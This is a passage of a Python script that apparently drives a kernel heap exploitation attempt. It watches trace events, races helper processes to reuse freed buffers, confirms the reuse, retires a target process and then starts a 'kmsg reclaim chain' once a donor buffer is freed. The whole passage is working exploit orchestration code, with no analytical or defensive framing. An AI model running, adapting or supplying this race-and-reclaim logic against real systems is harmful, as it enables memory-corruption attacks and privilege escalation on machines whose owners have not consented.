                    elif (
                        safe_sequence
                        and actual_started
                        and sequence != safe_sequence
                        and awaiting_actual is not None
                    ):
                        current_actual = awaiting_actual
                        awaiting_actual = None
                        actual_by_sequence[sequence] = (current_actual, destination)
                        persist(
                            f"ACTUAL_DESTINATION seq={sequence} "
                            f"helper={current_actual.helper} "
                            f"staged_cpu={current_actual.cpu} "
                            f"destination=0x{destination:x} "
                            f"expected=0x{expected_destination:x} "
                            f"cpu={parse_cpu(line)}"
                        )
                        relocated_hole = valid.get(destination)
                        relocated_upper = (
                            live.get(relocated_hole.upper)
                            if relocated_hole is not None
                            else None
                        )
                        relocated_valid = (
                            relocated_hole is not None
                            and relocated_upper is not None
                            and relocated_upper.pid == relocated_hole.upper_pid
                            and process_exists(relocated_hole.upper_pid)
                        )
                        direct_upper_pointer = destination + 0x10
                        direct_upper = live.get(direct_upper_pointer)
                        direct_valid = (
                            direct_upper is not None
                            and direct_upper.pid in upper_group.pids
                            and process_exists(direct_upper.pid)
                        )
                        if relocated_valid or direct_valid:
                            exact_sequence = sequence
                            if direct_valid and not relocated_valid:
                                persist(
                                    f"ACTUAL_DIRECT_LIVE_UPPER seq={sequence} "
                                    f"helper={current_actual.helper} "
                                    f"destination=0x{destination:x} "
                                    f"upper=0x{direct_upper_pointer:x} "
                                    f"upper_pid={direct_upper.pid} "
                                    f"upper_group={upper_group.index}"
                                )
                            elif destination != expected_destination:
                                persist(
                                    f"ACTUAL_RELOCATED_VALID_HOLE seq={sequence} "
                                    f"helper={current_actual.helper} "
                                    f"old_expected=0x{expected_destination:x} "
                                    f"destination=0x{destination:x} "
                                    f"upper=0x{relocated_hole.upper:x} "
                                    f"upper_pid={relocated_hole.upper_pid}"
                                )
                            expected_destination = destination
                            upper_pid = (
                                direct_upper.pid
                                if direct_valid
                                else relocated_hole.upper_pid
                            )
                            persist(
                                f"ACTUAL_EXACT_DESTINATION seq={sequence} "
                                f"helper={current_actual.helper} "
                                f"destination=0x{destination:x}"
                            )
                        else:
                            persist(
                                f"ACTUAL_DESTINATION_NOT_TARGET seq={sequence} "
                                f"helper={current_actual.helper} "
                                f"remaining={len(actual_pending)}"
                            )
                    continue

                if match := DESTINATION_FREE_RE.match(line):
                    sequence = int(match[2])
                    if (
                        sequence == safe_sequence
                        and not actual_started
                        and not actual_verified
                    ):
                        free_cpu = parse_cpu(line)
                        live_actuals = [
                            candidate
                            for candidate in actual_helpers
                            if process_exists(candidate.helper)
                        ]
                        matching = [
                            candidate
                            for candidate in live_actuals
                            if candidate.cpu == free_cpu
                        ]
                        others = [
                            candidate
                            for candidate in live_actuals
                            if candidate.cpu != free_cpu
                        ]
                        if args.require_staged_cpu_match and not matching:
                            eligible_actuals = []
                        else:
                            eligible_actuals = matching + others
                        actual_pending = eligible_actuals[: args.max_actual_attempts]
                        candidate_free_cpus.add(free_cpu)
                        observed_cpus = ",".join(
                            str(cpu) for cpu in sorted(candidate_free_cpus)
                        )
                        warmup_message = (
                            f"SAFE_CANDIDATE_CPU_WARMUP seq={sequence} "
                            f"free_cpu={free_cpu} observed_cpus={observed_cpus} "
                            f"count={len(candidate_free_cpus)} "
                            f"required={args.candidate_cpu_warmup}"
                        )
                        if not actual_pending:
                            available_cpus = ",".join(
                                str(candidate.cpu) for candidate in live_actuals
                            ) or "none"
                            persist(warmup_message)
                            persist(
                                f"SAFE_CANDIDATE_STAGED_CPU_REJECT seq={sequence} "
                                f"destination=0x{expected_destination:x} "
                                f"free_cpu={free_cpu} "
                                f"available_cpus={available_cpus} "
                                f"strict={int(args.require_staged_cpu_match)}"
                            )
                            safe_sequence = 0
                            expected_destination = 0
                            upper_pid = 0
                            continue
                        if len(candidate_free_cpus) < args.candidate_cpu_warmup:
                            persist(warmup_message)
                            actual_pending = []
                            safe_sequence = 0
                            expected_destination = 0
                            upper_pid = 0
                            continue
                        gate_message = (
                            f"SAFE_MATCH_FREE_GATE seq={sequence} "
                            f"destination=0x{expected_destination:x} "
                            f"upper_pid={upper_pid} free_cpu={free_cpu} "
                            f"race_count={len(actual_pending)}"
                        )
                        if args.free_settle_ms > 0:
                            time.sleep(args.free_settle_ms / 1000.0)
                        actual_started = True
                        launch_next_actual()
                        persist(warmup_message)
                        persist(gate_message)
                    continue

                if match := READ_RETURN_RE.match(line):
                    sequence = int(match[2])
                    bytes_read = int(match[6], 16)
                    actual_record = actual_by_sequence.get(sequence)
                    if actual_record is None:
                        continue
                    current_actual, actual_destination = actual_record
                    actual_returns.add(sequence)
                    if sequence != exact_sequence:
                        persist(
                            f"ACTUAL_RACE_MISS_RETURN safe_seq={safe_sequence} "
                            f"actual_seq={sequence} helper={current_actual.helper} "
                            f"expected=0x{expected_destination:x} "
                            f"actual=0x{actual_destination:x} "
                            f"bytes_read=0x{bytes_read:x}"
                        )
                        if (
                            exact_sequence == 0
                            and awaiting_actual is None
                            and actual_pending
                        ):
                            persist(
                                f"ACTUAL_SEQUENTIAL_RETRY completed={len(actual_returns)} "
                                f"remaining={len(actual_pending)}"
                            )
                            launch_next_actual()
                            continue
                        if (
                            exact_sequence == 0
                            and awaiting_actual is None
                            and not actual_pending
                            and len(actual_returns) == len(actual_by_sequence)
                        ):
                            persist(
                                f"RECYCLE_MISS safe_seq={safe_sequence} "
                                f"attempts={len(actual_returns)} "
                                f"expected=0x{expected_destination:x}"
                            )
                            raise SystemExit(3)
                        continue
                    if bytes_read != 0x20:
                        persist(
                            f"ACTUAL_COPY_LENGTH_MISMATCH seq={sequence} "
                            f"destination=0x{actual_destination:x} "
                            f"bytes_read=0x{bytes_read:x}"
                        )
                        raise SystemExit(4)
                    actual_verified = True
                    persist(
                        f"ACTUAL_REUSE_CONFIRMED safe_seq={safe_sequence} "
                        f"actual_seq={sequence} helper={current_actual.helper} "
                        f"destination=0x{actual_destination:x} "
                        f"upper_pid={upper_pid} bytes_read=0x{bytes_read:x}"
                    )
                    os.sync()
                    retire(upper_pid)
                    upper_retired = True
                    target_deadline = time.monotonic() + args.target_timeout
                    persist(
                        f"TARGET_UPPER_RETIRED group={upper_group.index} "
                        f"target_pid={upper_pid} destination=0x{actual_destination:x}"
                    )
                    continue

                if match := TARGET_FREE_RE.match(line):
                    pointer = int(match[2], 16)
                    if not upper_retired or pointer != args.donor_buffer:
                        continue
                    persist(
                        f"TARGET_FREE_OBSERVED ptr=0x{pointer:x} "
                        f"donor_parent={args.donor_parent} "
                        f"donor_child={args.donor_child}"
                    )
                    os.sync()
                    run_kmsg_reclaim_chain(
                        args,
                        follower,
                        live,
                        reclaim_holders,
                        frozen_post_reclaim_retire_pids,
                    )
                    return

                if match := META_RETURN_RE.match(line):
                    if int(match[2]) == safe_sequence or (
                        safe_sequence == 0 and event_pid in (0, helper.helper)
                    ):
                        helper_returned = True

            if helper_returned and safe_sequence == 0:
                break

        if upper_retired:
            stop_reclaim_holders(reclaim_holders)
            persist(
                f"TARGET_FREE_TIMEOUT ptr=0x{args.donor_buffer:x} "
                f"seconds={args.target_timeout:g}"
            )
            raise SystemExit(8)
        if safe_sequence:
            persist("CHAIN_INCOMPLETE_AFTER_SAFE_CANDIDATE")
            raise SystemExit(9)
        if not helper_returned:
            persist(
                f"SAFE_HELPER_TIMEOUT index={helper.index} helper={helper.helper}"
            )
            raise SystemExit(10)

    persist(
        f"NO_PLANNED_HOLE_HIT safe_helpers={len(safe_helpers)} "
        f"valid_holes={len(valid)}"
    )
    raise SystemExit(2)


if __name__ == "__main__":
    main()
